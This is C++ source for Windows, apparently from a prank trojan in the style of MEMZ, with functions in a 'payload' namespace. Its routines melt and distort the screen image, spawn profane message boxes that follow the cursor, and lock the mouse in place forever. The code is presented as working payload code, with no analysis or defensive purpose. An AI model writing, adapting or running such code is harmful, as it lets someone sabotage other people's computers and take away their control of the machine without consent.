#include <wincrypt.h>
#include <Windows.h>

namespace payload {

	const int MOUSESHAKE = 30;

	int width;
	int height;

	HCRYPTPROV prov;
	HDC hdc;

	void init() {
		hdc = GetDC(0);
		width = GetSystemMetrics(0);
		height = GetSystemMetrics(1);
	}

	int random(int maxsize) {
		if (prov == 0)
			if (!CryptAcquireContextA(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
				ExitProcess(1);

		int out;
		CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
		return (out & INT_MAX) % maxsize;
	}

	void melt() {
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, 500, height);
		HDC hdc2 = CreateCompatibleDC(hdc);
		SelectObject(hdc2, screenshot);

		for (int i = 0; i < 20; i++) {
			int x = random(width - 20 / 2);
			for (; x % 20 != 0; x++) {
			}

			BitBlt(hdc2, 0, 0, 20, height, hdc, x, 0, SRCCOPY);

			for (int j = 0; j < 20; j++) {
				int depth = sin(j / ((float)20) * 3.14159) * (50);
				StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
				BitBlt(hdc2, j, 0, 1, height, hdc2, j, -depth, SRCCOPY);
			}

			BitBlt(hdc, x, 0, 20, height, hdc2, 0, 0, SRCCOPY);
		}

		DeleteDC(hdc2);
		DeleteObject(screenshot);
	}

	void trapMouseForever() {
		POINT cursor;
		GetCursorPos(&cursor);
		while (1) {
			SetCursorPos(cursor.x, cursor.y);
			Sleep(1);
		}
	}

	// snip

	int mouseX, mouseY;
	LONG_PTR CALLBACK followMouseBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
		CWPRETSTRUCT* msg = (CWPRETSTRUCT*)lParam;

		if (msg->message == WM_INITDIALOG) {
			SetWindowPos(msg->hwnd, 0, mouseX, mouseY, 0, 0, SWP_NOZORDER | SWP_NOSIZE | SWP_SHOWWINDOW);
			for (int i = 1; i <= 11; i++)
				SetWindowTextA(GetDlgItem(msg->hwnd, i), "fucc");
		}

		return CallNextHookEx(0, nCode, wParam, lParam);
	}

	DWORD WINAPI followMouseBoxThread(void* param) {
		HHOOK hook = SetWindowsHookExA(WH_CALLWNDPROCRET, followMouseBoxHook, 0, GetCurrentThreadId());
		DWORD msg = random(7) + (random(5) << 4);
		MessageBoxA(NULL, "mouse fucked", "no clicky boi", msg);
		Sleep(100);
		UnhookWindowsHookEx(hook);
		return 0;
	}

	POINT sp;
	void msgboxmousefollow() {
		POINT p;
		if (GetCursorPos(&p)) {
			if (p.x != sp.x || p.y != sp.y) {
				mouseX = p.x;
				mouseY = p.y;
				CreateThread(nullptr, 0, &followMouseBoxThread, nullptr, 0, nullptr);
			}
			sp = p;
		}
	}

}